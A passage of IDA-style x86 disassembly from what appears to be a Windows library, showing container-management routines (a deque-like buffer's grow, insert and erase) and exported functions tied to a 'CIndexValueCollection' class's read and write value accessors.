loc_6AF33794:				; CODE XREF: sub_6AF33782+Bj
		mov	eax, [ecx+0Ch]
		add	eax, edx
		mov	[ebp+var_8], ecx
		lea	ecx, [ebp+var_8]
		mov	[ebp+var_4], eax
		call	sub_6AF33353
		leave
		retn	4
sub_6AF33782	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF337AB	proc near		; CODE XREF: sub_6AF33968+5Dp
					; sub_6AF33C47+CFp ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 0
		jz	short loc_6AF337DB
		mov	eax, [esi+0Ch]
		mov	ecx, [esi+4]
		mov	ecx, [ecx+eax*4]
		mov	eax, [ecx]
		push	0
		call	dword ptr [eax]
		inc	dword ptr [esi+0Ch]
		mov	eax, [esi+0Ch]
		cmp	[esi+8], eax
		ja	short loc_6AF337D2
		and	dword ptr [esi+0Ch], 0

loc_6AF337D2:				; CODE XREF: sub_6AF337AB+21j
		dec	dword ptr [esi+10h]
		jnz	short loc_6AF337DB
		and	dword ptr [esi+0Ch], 0

loc_6AF337DB:				; CODE XREF: sub_6AF337AB+7j
					; sub_6AF337AB+2Aj
		pop	esi
		retn
sub_6AF337AB	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF337DD	proc near		; CODE XREF: sub_6AF33968+82p
					; sub_6AF33B0C+7p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+10h]
		test	eax, eax
		jz	short loc_6AF3380E
		mov	ecx, [esi+0Ch]
		lea	eax, [eax+ecx-1]
		mov	ecx, [esi+8]
		cmp	ecx, eax
		ja	short loc_6AF337F7
		sub	eax, ecx

loc_6AF337F7:				; CODE XREF: sub_6AF337DD+16j
		mov	ecx, [esi+4]
		mov	eax, [ecx+eax*4]
		mov	edx, [eax]
		push	0
		mov	ecx, eax
		call	dword ptr [edx]
		dec	dword ptr [esi+10h]
		jnz	short loc_6AF3380E
		and	dword ptr [esi+0Ch], 0

loc_6AF3380E:				; CODE XREF: sub_6AF337DD+8j
					; sub_6AF337DD+2Bj
		pop	esi
		retn
sub_6AF337DD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33810	proc near		; CODE XREF: sub_6AF3436F+Cp
					; Ordinal250+36p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		lea	ecx, [eax-10h]
		xor	edx, edx
		cmp	[ecx+4], edx
		push	edi
		mov	edi, [ecx]
		jz	short loc_6AF33851
		cmp	[ecx+0Ch], edx
		jge	short loc_6AF33840
		cmp	[eax-8], edx
		jge	short loc_6AF33836
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF33836:				; CODE XREF: sub_6AF33810+1Aj
		mov	[eax-0Ch], edx
		mov	eax, [esi]
		mov	[eax], dx
		jmp	short loc_6AF33851
; ---------------------------------------------------------------------------

loc_6AF33840:				; CODE XREF: sub_6AF33810+15j
		call	sub_6AF3160D
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+0Ch]
		add	eax, 10h
		mov	[esi], eax

loc_6AF33851:				; CODE XREF: sub_6AF33810+10j
					; sub_6AF33810+2Ej
		pop	edi
		pop	esi
		retn
sub_6AF33810	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33854	proc near		; CODE XREF: sub_6AF33BA4+1Fp

arg_0		= dword	ptr  4

		mov	eax, [ecx]
		mov	edx, [eax-0Ch]
		sub	eax, 10h
		push	esi
		mov	esi, [esp+4+arg_0]
		cmp	edx, esi
		jle	short loc_6AF33867
		mov	esi, edx

loc_6AF33867:				; CODE XREF: sub_6AF33854+Fj
		cmp	dword ptr [eax+0Ch], 1
		jle	short loc_6AF33875
		push	esi
		call	sub_6AF3353D
		jmp	short loc_6AF33897
; ---------------------------------------------------------------------------

loc_6AF33875:				; CODE XREF: sub_6AF33854+17j
		mov	eax, [eax+8]
		cmp	eax, esi
		jge	short loc_6AF33897
		mov	edx, 400h
		cmp	eax, edx
		jle	short loc_6AF33889
		add	eax, edx
		jmp	short loc_6AF3388B
; ---------------------------------------------------------------------------

loc_6AF33889:				; CODE XREF: sub_6AF33854+2Fj
		add	eax, eax

loc_6AF3388B:				; CODE XREF: sub_6AF33854+33j
		cmp	eax, esi
		jge	short loc_6AF33891
		mov	eax, esi

loc_6AF33891:				; CODE XREF: sub_6AF33854+39j
		push	eax
		call	sub_6AF335A4

loc_6AF33897:				; CODE XREF: sub_6AF33854+1Fj
					; sub_6AF33854+26j
		pop	esi
		retn	4
sub_6AF33854	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3389B	proc near		; CODE XREF: sub_6AF33968+4Fp
					; sub_6AF33C47+20Cp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_0]
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF33658
		mov	eax, [ebp+arg_0]
		add	esp, 20h
		pop	ebp
		retn
sub_6AF3389B	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF338C3	proc near		; CODE XREF: sub_6AF33968+74p
					; sub_6AF33C47+10Ap ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_0]
		push	[ebp+arg_18]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF33615
		mov	eax, [ebp+arg_0]
		add	esp, 20h
		pop	ebp
		retn
sub_6AF338C3	endp

; Exported entry 176.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal176
Ordinal176	proc near		; DATA XREF: .rdata:6AF54D1Co
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, [esp+4+arg_4]
		and	dword ptr [esi], 0
		cmp	eax, [ecx+88h]
		jb	short loc_6AF3390E
		push	offset aCindexvaluec_3 ; "CIndexValueCollection::GetReadValue()	:"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF3391B
; ---------------------------------------------------------------------------

loc_6AF3390E:				; CODE XREF: Ordinal176+12j
		push	eax
		add	ecx, 78h
		call	sub_6AF33782
		mov	[esi], eax
		mov	al, 1

loc_6AF3391B:				; CODE XREF: Ordinal176+21j
		pop	esi
		retn	8
Ordinal176	endp

; Exported entry 177.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal177
Ordinal177	proc near		; DATA XREF: .rdata:6AF54D20o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		push	esi
		push	edi
		mov	edi, [esp+8+arg_4]
		and	dword ptr [edi], 0
		mov	esi, ecx
		cmp	eax, [esi+88h]
		jb	short loc_6AF33945
		push	offset aCindexvaluec_4 ; "CIndexValueCollection::GetWriteValue() "...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF33963
; ---------------------------------------------------------------------------

loc_6AF33945:				; CODE XREF: Ordinal177+15j
		push	eax
		lea	ecx, [esi+78h]
		call	sub_6AF33782
		mov	ecx, eax
		mov	[edi], eax
		call	Ordinal250
		mov	eax, [edi]
		mov	byte ptr [eax+44h], 1
		mov	byte ptr [esi+8], 1
		mov	al, 1

loc_6AF33963:				; CODE XREF: Ordinal177+24j
		pop	edi
		pop	esi
		retn	8
Ordinal177	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33968	proc near		; CODE XREF: sub_6AF33C28+13p
					; sub_6AF34310+43p ...

var_10		= dword	ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	eax, [ebp+arg_4]
		mov	edx, [ebp+arg_10]
		push	ebx
		mov	[ebp+var_8], eax
		push	esi
		push	edi
		mov	edi, [ebp+arg_8]
		mov	esi, ecx
		mov	ecx, [esi+0Ch]
		mov	eax, edi
		sub	eax, ecx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_C]
		mov	[ebp+var_10], eax
		mov	eax, edx
		sub	eax, edi
		mov	ebx, eax
		mov	eax, [esi+10h]
		lea	edi, [eax+ecx]
		mov	eax, edi
		sub	eax, edx
		cmp	[ebp+var_4], eax
		mov	[ebp+var_10], esi
		lea	eax, [ebp+arg_4]
		jnb	short loc_6AF339CF
		push	edx
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	ecx
		push	esi
		push	eax
		call	sub_6AF3389B
		add	esp, 1Ch
		test	ebx, ebx
		jbe	short loc_6AF339F2

loc_6AF339C3:				; CODE XREF: sub_6AF33968+63j
		mov	ecx, esi
		call	sub_6AF337AB
		dec	ebx
		jnz	short loc_6AF339C3
		jmp	short loc_6AF339F2
; ---------------------------------------------------------------------------

loc_6AF339CF:				; CODE XREF: sub_6AF33968+40j
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	edi
		push	esi
		push	edx
		push	[ebp+arg_C]
		push	eax
		call	sub_6AF338C3
		add	esp, 1Ch
		test	ebx, ebx
		jbe	short loc_6AF339F2

loc_6AF339E8:				; CODE XREF: sub_6AF33968+88j
		mov	ecx, esi
		call	sub_6AF337DD
		dec	ebx
		jnz	short loc_6AF339E8

loc_6AF339F2:				; CODE XREF: sub_6AF33968+59j
					; sub_6AF33968+65j ...
		mov	ecx, [esi+0Ch]
		mov	eax, [ebp+arg_0]
		add	ecx, [ebp+var_4]
		pop	edi
		mov	[eax], esi
		pop	esi
		mov	[eax+4], ecx
		pop	ebx
		leave
		retn	14h
sub_6AF33968	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall sub_6AF33A07(int, int)
sub_6AF33A07	proc near		; CODE XREF: sub_6AF33B50+Fp
					; sub_6AF33BCE+Ep

var_8		= dword	ptr -8
Dst		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		mov	esi, ecx
		mov	eax, [esi+8]
		mov	edx, 38E38E3h
		mov	ecx, edx
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF33A2A
		mov	ecx, esi
		call	sub_6AF333E4
; ---------------------------------------------------------------------------

loc_6AF33A2A:				; CODE XREF: sub_6AF33A07+1Aj
		mov	ecx, eax
		shr	ecx, 1
		cmp	ecx, 8
		jnb	short loc_6AF33A36
		push	8
		pop	ecx

loc_6AF33A36:				; CODE XREF: sub_6AF33A07+2Aj
		cmp	ebx, ecx
		jnb	short loc_6AF33A42
		sub	edx, ecx
		cmp	eax, edx
		ja	short loc_6AF33A42
		mov	ebx, ecx

loc_6AF33A42:				; CODE XREF: sub_6AF33A07+31j
					; sub_6AF33A07+37j
		add	eax, ebx
		push	edi
		mov	edi, [esi+0Ch]
		shl	eax, 2
		push	eax		; Size
		mov	[ebp+arg_0], edi
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, [esi+4]
		mov	[ebp+Dst], eax
		shl	edi, 2
		add	eax, edi
		push	esi		; int
		push	eax		; Dst
		mov	eax, [esi+8]
		lea	eax, [ecx+eax*4]
		push	eax		; int
		add	ecx, edi
		push	ecx		; Src
		call	sub_6AF335CC
		mov	ecx, [esi+4]
		add	esp, 14h
		cmp	[ebp+arg_0], ebx
		ja	short loc_6AF33AB6
		and	[ebp+var_8], 0
		lea	edx, [ebp+var_8]
		push	edx
		mov	edx, ebx
		sub	edx, [ebp+arg_0]
		push	edx
		push	esi		; int
		push	eax		; Dst
		lea	eax, [ecx+edi]
		push	eax		; int
		push	ecx		; Src
		call	sub_6AF335CC
		add	esp, 10h
		push	eax
		call	sub_6AF5026D
		and	[ebp+var_8], 0
		lea	eax, [ebp+var_8]
		push	eax
		push	[ebp+arg_0]
		push	[ebp+Dst]
		call	sub_6AF5026D
		add	esp, 18h
		jmp	short loc_6AF33AEE
; ---------------------------------------------------------------------------

loc_6AF33AB6:				; CODE XREF: sub_6AF33A07+72j
		push	esi		; int
		push	eax		; Dst
		lea	eax, [ecx+ebx*4]
		push	eax		; int
		push	ecx		; Src
		call	sub_6AF335CC
		mov	eax, [esi+4]
		and	[ebp+arg_0], 0
		add	esp, 10h
		lea	ecx, [ebp+arg_0]
		push	ecx
		push	ebx
		push	esi		; int
		push	[ebp+Dst]	; Dst
		lea	ecx, [eax+edi]
		push	ecx		; int
		lea	eax, [eax+ebx*4]
		push	eax		; Src
		call	sub_6AF335CC
		add	esp, 10h
		push	eax
		call	sub_6AF5026D
		add	esp, 0Ch

loc_6AF33AEE:				; CODE XREF: sub_6AF33A07+ADj
		mov	eax, [esi+4]
		test	eax, eax
		pop	edi
		jz	short loc_6AF33AFD
		push	eax		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF33AFD:				; CODE XREF: sub_6AF33A07+EDj
		mov	eax, [ebp+Dst]
		add	[esi+8], ebx
		mov	[esi+4], eax
		pop	esi
		pop	ebx
		leave
		retn	4
sub_6AF33A07	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33B0C	proc near		; CODE XREF: Ordinal162+1Cp
					; Ordinal157+11p ...
		push	esi
		mov	esi, ecx
		jmp	short loc_6AF33B18
; ---------------------------------------------------------------------------

loc_6AF33B11:				; CODE XREF: sub_6AF33B0C+10j
		mov	ecx, esi
		call	sub_6AF337DD

loc_6AF33B18:				; CODE XREF: sub_6AF33B0C+3j
		cmp	dword ptr [esi+10h], 0
		jnz	short loc_6AF33B11
		push	edi
		mov	edi, [esi+8]
		jmp	short loc_6AF33B33
; ---------------------------------------------------------------------------

loc_6AF33B24:				; CODE XREF: sub_6AF33B0C+2Cj
		dec	edi
		mov	eax, [eax+edi*4]
		test	eax, eax
		jz	short loc_6AF33B33
		push	eax		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF33B33:				; CODE XREF: sub_6AF33B0C+16j
					; sub_6AF33B0C+1Ej
		test	edi, edi
		mov	eax, [esi+4]
		ja	short loc_6AF33B24
		test	eax, eax
		pop	edi
		jz	short loc_6AF33B46
		push	eax		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF33B46:				; CODE XREF: sub_6AF33B0C+31j
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+4], 0
		pop	esi
		retn
sub_6AF33B0C	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33B50	proc near		; CODE XREF: sub_6AF33C47+54p
					; sub_6AF33C47+7Bp ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi+10h]
		inc	eax
		cmp	[esi+8], eax
		push	edi
		ja	short loc_6AF33B64
		push	1		; int
		call	sub_6AF33A07

loc_6AF33B64:				; CODE XREF: sub_6AF33B50+Bj
		mov	edi, [esi+0Ch]
		test	edi, edi
		jnz	short loc_6AF33B6E
		mov	edi, [esi+8]

loc_6AF33B6E:				; CODE XREF: sub_6AF33B50+19j
		mov	eax, [esi+4]
		dec	edi
		cmp	dword ptr [eax+edi*4], 0
		jnz	short loc_6AF33B86
		push	48h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		pop	ecx
		mov	ecx, [esi+4]
		mov	[ecx+edi*4], eax

loc_6AF33B86:				; CODE XREF: sub_6AF33B50+26j
		mov	eax, [esi+4]
		mov	ecx, [eax+edi*4]
		test	ecx, ecx
		jz	short loc_6AF33B99
		push	[esp+8+arg_0]
		call	Ordinal247

loc_6AF33B99:				; CODE XREF: sub_6AF33B50+3Ej
		inc	dword ptr [esi+10h]
		mov	[esi+0Ch], edi
		pop	edi
		pop	esi
		retn	4
sub_6AF33B50	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33BA4	proc near		; CODE XREF: sub_6AF3436F+34p
					; Ordinal301+103p ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		xor	ecx, ecx
		sub	eax, 10h
		inc	ecx
		sub	ecx, [eax+0Ch]
		mov	eax, [eax+8]
		sub	eax, [esp+4+arg_0]
		or	ecx, eax
		jge	short loc_6AF33BC8
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	sub_6AF33854

loc_6AF33BC8:				; CODE XREF: sub_6AF33BA4+17j
		mov	eax, [esi]
		pop	esi
		retn	4
sub_6AF33BA4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF33BCE	proc near		; CODE XREF: sub_6AF33C47+145p
					; sub_6AF33C47+16Ep ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi+10h]
		inc	eax
		cmp	[esi+8], eax
		ja	short loc_6AF33BE1
		push	1		; int
		call	sub_6AF33A07

loc_6AF33BE1:				; CODE XREF: sub_6AF33BCE+Aj
		mov	eax, [esi+0Ch]
		add	eax, [esi+10h]
		mov	ecx, [esi+8]
		cmp	ecx, eax
		ja	short loc_6AF33BF0
		sub	eax, ecx

loc_6AF33BF0:				; CODE XREF: sub_6AF33BCE+1Ej
		push	edi
		mov	edi, eax
		mov	eax, [esi+4]
		shl	edi, 2
		cmp	dword ptr [edi+eax], 0
		jnz	short loc_6AF33C0D
		push	48h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		pop	ecx
		mov	ecx, [esi+4]
		mov	[edi+ecx], eax

loc_6AF33C0D:				; CODE XREF: sub_6AF33BCE+2Fj
		mov	eax, [esi+4]
		mov	ecx, [edi+eax]
		test	ecx, ecx
		pop	edi
		jz	short loc_6AF33C21
		push	[esp+4+arg_0]
		call	Ordinal247

loc_6AF33C21:				; CODE XREF: sub_6AF33BCE+48j
		inc	dword ptr [esi+10h]
		pop	esi
		retn	4
sub_6AF33BCE	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33C28	proc near		; CODE XREF: Ordinal161+41p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_8]
		mov	edx, [ebp+arg_4]
		inc	eax
		push	eax
		push	edx
		push	[ebp+arg_8]
		push	edx
		push	[ebp+arg_0]
		call	sub_6AF33968
		mov	eax, [ebp+arg_0]
		pop	ebp
		retn	0Ch
sub_6AF33C28	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33C47	proc near		; CODE XREF: sub_6AF34310+2Ap

var_B8		= byte ptr -0B8h
var_70		= byte ptr -70h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	eax, offset unknown_libname_30 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 0ACh
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		mov	esi, ecx
		mov	ecx, [ebp+arg_0]
		mov	eax, [esi+0Ch]
		mov	[ebp+var_24], ecx
		mov	ecx, [esi+10h]
		sub	ebx, eax
		mov	eax, ecx
		sub	eax, ebx
		cmp	ebx, eax
		push	edi
		mov	edi, [ebp+arg_8]
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		mov	[ebp+arg_4], eax
		mov	[ebp+var_1C], ecx
		jnb	loc_6AF33D76
		and	[ebp+var_4], 0
		cmp	ebx, edi
		jnb	short loc_6AF33CE7
		sub	edi, ebx

loc_6AF33C92:				; CODE XREF: sub_6AF33C47+5Aj
		test	edi, edi
		jbe	short loc_6AF33CA3
		push	[ebp+arg_C]
		mov	ecx, esi
		call	sub_6AF33B50
		dec	edi
		jmp	short loc_6AF33C92
; ---------------------------------------------------------------------------

loc_6AF33CA3:				; CODE XREF: sub_6AF33C47+4Dj
		mov	edi, ebx

loc_6AF33CA5:				; CODE XREF: sub_6AF33C47+81j
		test	edi, edi
		mov	eax, [esi+0Ch]
		jbe	short loc_6AF33CCA
		mov	[ebp+arg_4], eax
		mov	eax, [ebp+arg_8]
		dec	eax
		push	eax
		lea	ecx, [ebp+arg_0]
		mov	[ebp+arg_0], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33B50
		dec	edi
		jmp	short loc_6AF33CA5
; ---------------------------------------------------------------------------

loc_6AF33CCA:				; CODE XREF: sub_6AF33C47+63j
		add	eax, [ebp+arg_8]
		push	[ebp+arg_C]
		mov	ecx, eax
		add	ecx, ebx
		push	ecx
		mov	edx, esi
		push	edx
		push	eax

loc_6AF33CD9:				; CODE XREF: sub_6AF33C47+188j
		push	esi
		call	sub_6AF335E9
		add	esp, 14h
		jmp	loc_6AF33E7B
; ---------------------------------------------------------------------------

loc_6AF33CE7:				; CODE XREF: sub_6AF33C47+47j
					; sub_6AF33C47+C3j
		test	edi, edi
		jbe	short loc_6AF33D25
		mov	eax, [esi+0Ch]
		mov	[ebp+arg_4], eax
		mov	eax, [ebp+arg_8]
		dec	eax
		push	eax
		lea	ecx, [ebp+arg_0]
		mov	[ebp+arg_0], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33B50
		dec	edi
		jmp	short loc_6AF33CE7
; ---------------------------------------------------------------------------

loc_6AF33D0C:				; DATA XREF: .rdata:stru_6AF62170o
		mov	esi, [ebp+var_28]
		mov	edi, [ebp+var_1C]
		jmp	short loc_6AF33D1B
; ---------------------------------------------------------------------------

loc_6AF33D14:				; CODE XREF: sub_6AF33C47+D7j
		mov	ecx, esi
		call	sub_6AF337AB

loc_6AF33D1B:				; CODE XREF: sub_6AF33C47+CBj
		cmp	edi, [esi+10h]
		jb	short loc_6AF33D14
		jmp	loc_6AF33E1C
; ---------------------------------------------------------------------------

loc_6AF33D25:				; CODE XREF: sub_6AF33C47+A2j
		mov	edi, [esi+0Ch]
		push	[ebp+arg_C]
		add	edi, [ebp+arg_8]
		lea	ecx, [ebp+var_70]
		call	Ordinal247
		push	edi
		mov	eax, esi
		push	eax
		mov	ecx, edi
		add	ecx, ebx
		push	ecx
		mov	edx, edi
		add	edx, [ebp+arg_8]
		push	esi
		push	edx
		mov	[ebp+arg_0], eax
		mov	[ebp+var_24], eax
		lea	eax, [ebp+arg_0]
		push	esi
		push	eax
		call	sub_6AF338C3
		lea	edx, [ebp+var_70]
		push	edx
		mov	eax, esi
		mov	ecx, eax
		mov	eax, [esi+0Ch]
		add	edi, ebx
		push	edi
		push	ecx
		add	eax, ebx
		push	eax
		push	esi
		call	sub_6AF335E9
		lea	ecx, [ebp+var_70]
		jmp	loc_6AF33E73
; ---------------------------------------------------------------------------

loc_6AF33D76:				; CODE XREF: sub_6AF33C47+3Bj
		cmp	eax, edi
		mov	[ebp+var_4], 2
		jnb	short loc_6AF33DD4
		sub	edi, eax

loc_6AF33D83:				; CODE XREF: sub_6AF33C47+14Ej
		test	edi, edi
		jbe	short loc_6AF33D97
		push	[ebp+arg_C]
		mov	ecx, esi
		call	sub_6AF33BCE
		mov	eax, [ebp+arg_4]
		dec	edi
		jmp	short loc_6AF33D83
; ---------------------------------------------------------------------------

loc_6AF33D97:				; CODE XREF: sub_6AF33C47+13Ej
		xor	edi, edi

loc_6AF33D99:				; CODE XREF: sub_6AF33C47+177j
		cmp	edi, eax
		jnb	short loc_6AF33DC0
		mov	eax, [esi+0Ch]
		mov	[ebp+var_14], eax
		lea	eax, [edi+ebx]
		push	eax
		lea	ecx, [ebp+var_18]
		mov	[ebp+var_18], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33BCE
		mov	eax, [ebp+arg_4]
		inc	edi
		jmp	short loc_6AF33D99
; ---------------------------------------------------------------------------

loc_6AF33DC0:				; CODE XREF: sub_6AF33C47+154j
		mov	ecx, [esi+0Ch]
		push	[ebp+arg_C]
		add	ecx, ebx
		mov	edx, ecx
		add	edx, eax
		push	edx
		push	esi
		push	ecx
		jmp	loc_6AF33CD9
; ---------------------------------------------------------------------------

loc_6AF33DD4:				; CODE XREF: sub_6AF33C47+138j
		and	[ebp+var_14], 0

loc_6AF33DD8:				; CODE XREF: sub_6AF33C47+1BFj
		cmp	[ebp+var_14], edi
		jnb	short loc_6AF33E25
		mov	ecx, [esi+0Ch]
		mov	[ebp+var_20], ecx
		mov	ecx, [ebp+var_14]
		sub	ecx, edi
		add	ecx, eax
		add	ecx, ebx
		push	ecx
		lea	ecx, [ebp+var_24]
		mov	[ebp+var_24], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33BCE
		inc	[ebp+var_14]
		mov	eax, [ebp+arg_4]
		jmp	short loc_6AF33DD8
; ---------------------------------------------------------------------------

loc_6AF33E08:				; DATA XREF: .rdata:stru_6AF62180o
		mov	esi, [ebp+var_28]
		mov	edi, [ebp+var_1C]
		jmp	short loc_6AF33E17
; ---------------------------------------------------------------------------

loc_6AF33E10:				; CODE XREF: sub_6AF33C47+1D3j
		mov	ecx, esi
		call	sub_6AF337DD

loc_6AF33E17:				; CODE XREF: sub_6AF33C47+1C7j
		cmp	edi, [esi+10h]
		jb	short loc_6AF33E10

loc_6AF33E1C:				; CODE XREF: sub_6AF33C47+D9j
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF33E25:				; CODE XREF: sub_6AF33C47+194j
		mov	edi, [esi+0Ch]
		push	[ebp+arg_C]
		lea	ecx, [ebp+var_B8]
		add	edi, ebx
		call	Ordinal247
		mov	eax, edi
		add	eax, [ebp+arg_4]
		mov	ecx, edi
		add	ecx, [ebp+arg_4]
		push	eax
		sub	ecx, [ebp+arg_8]
		mov	edx, esi
		push	edx
		push	ecx
		mov	ebx, esi
		push	ebx
		push	edi
		lea	eax, [ebp+arg_0]
		push	esi
		push	eax
		call	sub_6AF3389B
		mov	eax, edi
		add	eax, [ebp+arg_8]
		lea	ecx, [ebp+var_B8]
		push	ecx
		push	eax
		push	esi
		push	edi
		push	esi
		call	sub_6AF335E9
		lea	ecx, [ebp+var_B8]

loc_6AF33E73:				; CODE XREF: sub_6AF33C47+12Aj
		add	esp, 30h
		call	Ordinal246

loc_6AF33E7B:				; CODE XREF: sub_6AF33C47+9Bj
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	10h
sub_6AF33C47	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF33E8C	proc near		; CODE XREF: sub_6AF343D8+18p

var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		mov	eax, offset unknown_libname_31 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 20h
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		mov	esi, ecx
		mov	eax, [esi+0Ch]
		cmp	eax, ebx
		mov	ecx, [ebp+arg_0]
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_20], esi
		mov	[ebp+var_2C], ecx
		ja	short loc_6AF33EBB
		sub	ebx, eax
		mov	[ebp+var_18], ebx
		jmp	short loc_6AF33EC0
; ---------------------------------------------------------------------------

loc_6AF33EBB:				; CODE XREF: sub_6AF33E8C+26j
		sub	ebx, eax
		mov	[ebp+var_18], ebx

loc_6AF33EC0:				; CODE XREF: sub_6AF33E8C+2Dj
		mov	eax, [esi+10h]
		and	[ebp+var_14], 0
		mov	edi, eax
		mov	[ebp+var_24], eax
		lea	eax, [ebp+var_14]
		push	eax
		push	[ebp+arg_14]
		sub	edi, ebx
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		call	sub_6AF3369B
		add	esp, 14h
		cmp	ebx, edi
		jnb	loc_6AF33FE7
		mov	edi, [ebp+var_14]
		and	[ebp+var_4], 0
		cmp	ebx, edi
		jnb	short loc_6AF33F78
		mov	edx, [ebp+arg_C]
		mov	ecx, [ebp+arg_8]
		mov	eax, edi
		sub	eax, ebx
		add	edx, eax
		mov	[ebp+var_28], edx
		mov	[ebp+arg_0], ecx
		mov	[ebp+arg_4], edx

loc_6AF33F0E:				; CODE XREF: sub_6AF33E8C+A5j
		lea	eax, [ebp+arg_0]
		push	eax
		lea	ecx, [ebp+arg_8]
		call	sub_6AF333C8
		test	al, al
		jnz	short loc_6AF33F33
		dec	[ebp+arg_4]
